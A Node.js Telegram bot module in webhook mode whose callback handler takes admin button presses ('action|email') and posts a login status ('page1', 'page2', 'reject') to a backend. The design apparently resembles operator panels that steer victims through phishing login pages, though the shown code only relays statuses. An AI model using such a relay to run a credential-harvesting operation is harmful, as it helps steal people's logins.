const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const APP_URL = process.env.APP_URL;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("❌ Missing BOT_TOKEN, ADMIN_CHAT_ID, or APP_URL");
  process.exit(1);
}

// ============================================================================
// 🤖 BOT INITIALIZATION - NO POLLING (Render doesn't like it)
// ============================================================================

const bot = new TelegramBot(BOT_TOKEN, {
  polling: false // ✅ Disable polling - we'll use webhook in server.js instead
});

bot.getMe().then((me) => {
  console.log(`✅ Bot connected: @${me.username}`);
}).catch(err => {
  console.error("❌ Bot connection failed:", err.message);
});

// ============================================================================
// 🔘 CALLBACK HANDLER - Called from server.js webhook
// ============================================================================

const handledCallbacks = new Set();

async function handleCallbackQuery(query) {
  const callbackId = query.id;
  console.log(`\n🔘 CALLBACK QUERY RECEIVED!`);
  console.log(`   Callback ID: ${callbackId}`);
  console.log(`   Data: ${query.data}`);
  
  // Prevent duplicate processing
  if (handledCallbacks.has(callbackId)) {
    console.log(`⚠️ Duplicate callback ignored`);
    return;
  }
  handledCallbacks.add(callbackId);

  try {
    const data = query.data; // format: "action|email"
    const [action, email] = data.split("|");

    console.log(`\n🔘 LOGIN BUTTON CLICKED`);
    console.log(`   Action: ${action}`);
    console.log(`   Email: ${email}`);

    // Update status via backend
    console.log(`📤 Calling ${APP_URL}/update-status...`);
    const response = await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        email: email,
        status: action // "page1", "page2", or "reject"
      })
    });

    console.log(`📥 Response status: ${response.status}`);
    if (response.ok) {
      console.log(`✅ Status updated to: ${action}`);
    } else {
      console.error("❌ Failed to update status:", response.statusText);
    }

    // Acknowledge callback
    bot.answerCallbackQuery(callbackId, {
      text: "✅ Processing",
      show_alert: false
    }).catch(err => console.error("Failed to answer callback:", err.message));

  } catch (err) {
    console.error("❌ Callback error:", err.message);
    bot.answerCallbackQuery(query.id, {
      text: "❌ Error processing request",
      show_alert: true
    }).catch(() => {});
  }
}

console.log(`\n${"=".repeat(60)}`);
console.log(`✅ BOT.JS READY (Webhook mode - no polling)`);
console.log(`📍 Waiting for callbacks from server.js...`);
console.log(`${"=".repeat(60)}\n`);

module.exports = { bot, handleCallbackQuery };
